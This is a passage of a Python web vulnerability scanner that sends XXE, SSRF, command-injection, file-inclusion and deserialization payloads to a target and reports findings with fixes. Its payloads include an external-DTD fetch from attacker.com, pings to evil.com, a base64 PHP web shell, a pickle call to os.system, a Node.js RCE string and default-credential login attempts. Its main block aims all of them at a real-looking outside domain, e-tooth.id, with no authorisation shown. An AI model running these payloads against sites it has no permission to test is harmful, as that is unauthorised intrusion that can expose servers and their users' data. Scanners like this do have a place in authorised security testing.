            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&send;</data>'
        ]

        content_types = ['application/xml', 'text/xml']

        for payload in xxe_payloads:
            for content_type in content_types:
                headers = {'Content-Type': content_type}
                async with self.session.post(self.target_url, data=payload, headers=headers) as response:
                    content = await response.text()
                    if 'root:' in content or 'USER=' in content:
                        findings.append({
                            'severity': 'Critical',
                            'category': 'XXE',
                            'description': 'XXE vulnerability detected',
                            'impact': 'Attackers could read arbitrary files on the server or perform SSRF attacks',
                            'recommendation': 'Disable XML external entity processing in all XML parsers'
                        })

        return findings

    async def test_ssrf_vulnerabilities(self) -> List[Dict[str, Any]]:
        logger.info("Testing for SSRF vulnerabilities")
        findings = []

        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1:22',
            'http://[::]:22',
            'http://2130706433:22',
            'http://0x7f000001:22',
            'http://017700000001:22',
            'http://localhost:22',
        ]

        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in ssrf_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url, allow_redirects=False) as response:
                    if response.status in [200, 301, 302]:
                        findings.append({
                            'severity': 'High',
                            'category': 'SSRF',
                            'description': f'Potential SSRF vulnerability found in parameter: {param}',
                            'impact': 'Attackers could access internal resources or perform port scanning',
                            'recommendation': 'Implement strict input validation and use allowlists for external resource access'
                        })

        return findings

    async def test_open_redirects(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Open Redirects")
        findings = []

        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '////evil.com',
            'https:evil.com',
            r'https:/\evil.com',
            '/%0D/evil.com',
            '//%0D%0Aevil.com',
            '//%E3%80%82evil.com',
            '/%09/evil.com',
            '//%5Cevil.com',
            '//evil%E3%80%82com',
        ]

        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in redirect_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url, allow_redirects=False) as response:
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location:
                            findings.append({
                                'severity': 'Medium',
                                'category': 'Open Redirect',
                                'description': f'Open Redirect vulnerability found in parameter: {param}',
                                'impact': 'Attackers could redirect users to malicious websites',
                                'recommendation': 'Implement strict validation of redirect URLs and use allowlists'
                            })

        return findings

    async def test_command_injection(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Command Injection vulnerabilities")
        findings = []

        cmd_injection_payloads = [
            ';ls -la',
            '| ls -la',
            '`ls -la`',
            '$(ls -la)',
            '; ping -c 3 evil.com',
            '| ping -c 3 evil.com',
            '`ping -c 3 evil.com`',
            '$(ping -c 3 evil.com)',
        ]

        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in cmd_injection_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    if 'total' in content or 'bytes from' in content:
                        findings.append({
                            'severity': 'Critical',
                            'category': 'Command Injection',
                            'description': f'Potential Command Injection vulnerability found in parameter: {param}',
                            'impact': 'Attackers could execute arbitrary commands on the server',
                            'recommendation': 'Avoid passing user input to system commands. If necessary, implement strict input validation and use allowlists'
                        })

        return findings

    async def test_file_inclusion(self) -> List[Dict[str, Any]]:
        logger.info("Testing for File Inclusion vulnerabilities")
        findings = []

        file_inclusion_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd%00',
            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
            'expect://ls',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=',
        ]

        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        for param, value in params.items():
            for payload in file_inclusion_payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={payload}")
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    if 'root:' in content or 'Shell done !' in content:
                        findings.append({
                            'severity': 'High',
                            'category': 'File Inclusion',
                            'description': f'Potential File Inclusion vulnerability found in parameter: {param}',
                            'impact': 'Attackers could read sensitive files or execute arbitrary code',
                            'recommendation': 'Implement strict input validation and avoid passing user input to file operations'
                        })

        return findings

    async def test_insecure_deserialization(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Insecure Deserialization vulnerabilities")
        findings = []

        deserialization_payloads = [
            base64.b64encode(pickle.dumps({'user_id': 1, 'is_admin': True})).decode(),
            base64.b64encode(pickle.dumps({'__reduce__': (os.system, ('id',))})).decode(),
            'O:8:"stdClass":1:{s:5:"hello";s:6:"world!";}', 
            '{"rce":"_$$ND_FUNC$$_function (){\n    require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });\n  }()"}',  
        ]

        for payload in deserialization_payloads:
            headers = {'Content-Type': 'application/json'}
            data = json.dumps({'data': payload})
            async with self.session.post(f"{self.target_url}/api/deserialize", headers=headers, data=data) as response:
                content = await response.text()
                if 'uid=' in content or 'gid=' in content or 'world!' in content:
                    findings.append({
                        'severity': 'Critical',
                        'category': 'Insecure Deserialization',
                        'description': 'Potential Insecure Deserialization vulnerability detected',
                        'impact': 'Attackers could execute arbitrary code on the server',
                        'recommendation': 'Avoid deserializing untrusted data. If necessary, use secure deserialization libraries and implement integrity checks'
                    })

        return findings

    async def test_broken_authentication(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Broken Authentication")
        findings = []

        # Test for weak password policy
        weak_passwords = ['password', '123456', 'qwerty', 'admin', '']
        login_url = f"{self.target_url}/login"  
        for password in weak_passwords:
            data = {'username': 'testuser', 'password': password}
            async with self.session.post(login_url, data=data) as response:
                if response.status == 302:  
                    findings.append({
                        'severity': 'High',
                        'category': 'Broken Authentication',
                        'description': 'Weak password accepted',
                        'impact': 'Attackers could easily guess user passwords',
                        'recommendation': 'Implement a strong password policy'
                    })
                    break

        # Test for lack of brute-force protection
        for i in range(10):
            data = {'username': 'testuser', 'password': f'wrongpassword{i}'}
            async with self.session.post(login_url, data=data) as response:
                if i == 9 and response.status != 429:  
                    findings.append({
                        'severity': 'High',
                        'category': 'Broken Authentication',
                        'description': 'No protection against brute-force attacks',
                        'impact': 'Attackers could perform unlimited login attempts',
                        'recommendation': 'Implement account lockout or login attempt rate limiting'
                    })

        # Test for secure session management
        async with self.session.get(f"{self.target_url}/profile") as response:
            cookies = response.cookies
            if 'session' in cookies:
                if not cookies['session'].get('secure', False) or not cookies['session'].get('httponly', False):
                    findings.append({
                        'severity': 'Medium',
                        'category': 'Broken Authentication',
                        'description': 'Insecure session cookie settings',
                        'impact': 'Session cookies could be stolen or manipulated',
                        'recommendation': 'Set Secure and HttpOnly flags on session cookies'
                    })

        return findings

    async def test_sensitive_data_exposure(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Sensitive Data Exposure")
        findings = []

        # Check for sensitive information in HTML comments
        async with self.session.get(self.target_url) as response:
            content = await response.text()
            sensitive_patterns = [
                r'\b(?:password|passwd|pwd)\s*[=:]\s*\S+',
                r'\b(?:username|user|usr)\s*[=:]\s*\S+',
                r'\b(?:api[_-]?key|apikey)\s*[=:]\s*\S+',
                r'\b(?:secret[_-]?key|secretkey)\s*[=:]\s*\S+',
                r'\b(?:access[_-]?token|accesstoken)\s*[=:]\s*\S+',
            ]
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    findings.append({
                        'severity': 'High',
                        'category': 'Sensitive Data Exposure',
                        'description': f'Sensitive information found in HTML content: {matches}',
                        'impact': 'Attackers could obtain sensitive information directly from the page source',
                        'recommendation': 'Remove all sensitive information from HTML comments and client-side code'
                    })

        # Check for directory listing
        async with self.session.get(f"{self.target_url}/images/") as response:
            if "Index of /images" in await response.text():
                findings.append({
                    'severity': 'Medium',
                    'category': 'Sensitive Data Exposure',
                    'description': 'Directory listing is enabled',
                    'impact': 'Attackers could browse and access sensitive files',
                    'recommendation': 'Disable directory listing on the web server'
                })

        # Check for sensitive files
        sensitive_files = ['/robots.txt', '/sitemap.xml', '/.git/config', '/.env', '/backup.sql']
        for file in sensitive_files:
            async with self.session.get(f"{self.target_url}{file}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'Medium',
                        'category': 'Sensitive Data Exposure',
                        'description': f'Sensitive file accessible: {file}',
                        'impact': 'Attackers could access sensitive information or configuration details',
                        'recommendation': f'Remove or protect the {file} file'
                    })

        return findings

    async def test_broken_access_control(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Broken Access Control")
        findings = []

        # Test for horizontal privilege escalation
        async with self.session.get(f"{self.target_url}/profile?user_id=2") as response:
            if response.status == 200:
                findings.append({
                    'severity': 'High',
                    'category': 'Broken Access Control',
                    'description': 'Possible horizontal privilege escalation',
                    'impact': 'Users could access or modify other users\' data',
                    'recommendation': 'Implement proper access controls and user authentication checks'
                })

        # Test for forced browsing to admin pages
        admin_pages = ['/admin', '/dashboard', '/management']
        for page in admin_pages:
            async with self.session.get(f"{self.target_url}{page}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'Critical',
                        'category': 'Broken Access Control',
                        'description': f'Admin page accessible without authentication: {page}',
                        'impact': 'Unauthorized users could access admin functionality',
                        'recommendation': 'Implement proper access controls for all sensitive pages'
                    })

        # Test for IDOR (Insecure Direct Object References)
        async with self.session.get(f"{self.target_url}/api/user/1") as response:
            if response.status == 200:
                findings.append({
                    'severity': 'High',
                    'category': 'Broken Access Control',
                    'description': 'Possible IDOR vulnerability in user API',
                    'impact': 'Attackers could access or modify unauthorized user data',
                    'recommendation': 'Implement proper authorization checks for all API endpoints'
                })

        return findings

    async def test_security_misconfiguration(self) -> List[Dict[str, Any]]:
        logger.info("Testing for Security Misconfiguration")
        findings = []

        # Check for default credentials
        default_creds = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('user', 'user'),
        ]
        login_url = f"{self.target_url}/login"
        for username, password in default_creds:
            async with self.session.post(login_url, data={'username': username, 'password': password}) as response:
                if response.status == 302:  
                    findings.append({
                        'severity': 'Critical',
                        'category': 'Security Misconfiguration',
                        'description': f'Default credentials work: {username}:{password}',
                        'impact': 'Attackers could easily gain unauthorized access',
                        'recommendation': 'Change all default credentials and implement a strong password policy'
                    })

        # Check for unnecessary features
        unnecessary_features = ['/phpinfo.php', '/server-status', '/test.php']
        for feature in unnecessary_features:
            async with self.session.get(f"{self.target_url}{feature}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'Medium',
                        'category': 'Security Misconfiguration',
                        'description': f'Unnecessary feature enabled: {feature}',
                        'impact': 'Increases attack surface and could leak sensitive information',
                        'recommendation': f'Disable or remove the {feature} page'
                    })

        # Check for error messages with stack traces
        async with self.session.get(f"{self.target_url}/trigger_error") as response:
            content = await response.text()
            if 'stack trace' in content.lower() or 'exception' in content.lower():
                findings.append({
                    'severity': 'Medium',
                    'category': 'Security Misconfiguration',
                    'description': 'Detailed error messages exposed',
                    'impact': 'Stack traces could reveal sensitive application details',
                    'recommendation': 'Disable debug error messages in production'
                })

        return findings

    async def test_api_security(self) -> List[Dict[str, Any]]:
        logger.info("Testing API Security")
        findings = []

        # Test for lack of rate limiting
        for _ in range(50):
            async with self.session.get(f"{self.target_url}/api/data") as response:
                if _ == 49 and response.status != 429:
                    findings.append({
                        'severity': 'Medium',
                        'category': 'API Security',
                        'description': 'No rate limiting on API endpoint',
                        'impact': 'API could be vulnerable to abuse and DoS attacks',
                        'recommendation': 'Implement rate limiting on all API endpoints'
                    })

        # Test for improper API versioning
        old_version_endpoints = ['/api/v1/users', '/api/v2/users']
        for endpoint in old_version_endpoints:
            async with self.session.get(f"{self.target_url}{endpoint}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'Low',
                        'category': 'API Security',
                        'description': f'Old API version still accessible: {endpoint}',
                        'impact': 'Old, potentially vulnerable API versions could be exploited',
                        'recommendation': 'Deprecate and remove old API versions, use proper API versioning'
                    })

        # Test for lack of input validation
        payload = {"user": {"email": "notanemail"}}
        async with self.session.post(f"{self.target_url}/api/users", json=payload) as response:
            if response.status == 200:
                findings.append({
                    'severity': 'High',
                    'category': 'API Security',
                    'description': 'Lack of input validation in API',
                    'impact': 'API could be vulnerable to various injection attacks',
                    'recommendation': 'Implement strict input validation for all API inputs'
                })

        return findings

    async def test_docker_security(self) -> List[Dict[str, Any]]:
        logger.info("Testing Docker Security")
        findings = []

        # Check if Docker socket is exposed
        async with self.session.get(f"{self.target_url}/docker.sock") as response:
            if response.status == 200:
                findings.append({
                    'severity': 'Critical',
                    'category': 'Docker Security',
                    'description': 'Docker socket is exposed',
                    'impact': 'Attackers could gain full control over the Docker host',
                    'recommendation': 'Never expose the Docker socket to the public internet'
                })

        # Check for common Docker misconfigurations
        docker_endpoints = ['/version', '/info', '/containers/json', '/images/json']
        for endpoint in docker_endpoints:
            async with self.session.get(f"{self.target_url}:2375{endpoint}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'Critical',
                        'category': 'Docker Security',
                        'description': f'Docker API endpoint exposed: {endpoint}',
                        'impact': 'Attackers could manipulate Docker containers and images',
                        'recommendation': 'Secure the Docker daemon and API endpoints'
                    })

        return findings

    async def test_kubernetes_security(self) -> List[Dict[str, Any]]:
        logger.info("Testing Kubernetes Security")
        findings = []

        # Check for exposed Kubernetes API server
        async with self.session.get(f"{self.target_url}:6443") as response:
            if response.status == 401 or response.status == 403:
                findings.append({
                    'severity': 'Critical',
                    'category': 'Kubernetes Security',
                    'description': 'Kubernetes API server potentially exposed',
                    'impact': 'Attackers could potentially access and manipulate the Kubernetes cluster',
                    'recommendation': 'Ensure Kubernetes API server is not exposed to the public internet'
                })

        # Check for common Kubernetes misconfigurations
        k8s_endpoints = ['/api', '/api/v1', '/apis', '/healthz']
        for endpoint in k8s_endpoints:
            async with self.session.get(f"{self.target_url}:8080{endpoint}") as response:
                if response.status == 200:
                    findings.append({
                        'severity': 'High',
                        'category': 'Kubernetes Security',
                        'description': f'Kubernetes endpoint exposed: {endpoint}',
                        'impact': 'Sensitive information about the Kubernetes cluster could be leaked',
                        'recommendation': 'Secure all Kubernetes API endpoints and use proper authentication'
                    })

        return findings

    async def run_all_tests(self):
        await self.initialize()  
        all_findings = []
        tests = [
            self.test_ssl_tls_security(),
            self.test_http_security_headers(),
            self.test_xss_vulnerabilities(),
            self.test_sql_injection(),
            self.test_csrf_vulnerabilities(),
            self.test_clickjacking_vulnerabilities(),
            self.test_xxe_vulnerabilities(),
            self.test_ssrf_vulnerabilities(),
            self.test_open_redirects(),
            self.test_command_injection(),
            self.test_file_inclusion(),
            self.test_insecure_deserialization(),
            self.test_broken_authentication(),
            self.test_sensitive_data_exposure(),    
            self.test_broken_access_control(),
            self.test_security_misconfiguration(),
            self.test_api_security(),
            self.test_docker_security(),
            self.test_kubernetes_security(),
        ]
        
        try:
            results = await asyncio.gather(*tests, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f"An error occurred during testing: {str(result)}")
                else:
                    all_findings.extend(result)
        finally:
            await self.close()  
        
        return all_findings

if __name__ == "__main__":
    async def main():
        target_url = "https://e-tooth.id/" 
        tester = AdvancedWebSecurityTester(target_url)
        try:
            findings = await tester.run_all_tests()
            
            print("Security Test Results:")
            for finding in findings:
                print(f"Severity: {finding['severity']}")
                print(f"Category: {finding['category']}")
                print(f"Description: {finding['description']}")
                print(f"Impact: {finding['impact']}")
                print(f"Recommendation: {finding['recommendation']}")
                print("---")
        except Exception as e:
            print(f"An error occurred: {str(e)}")
        finally:
            await tester.close()  

    asyncio.run(main())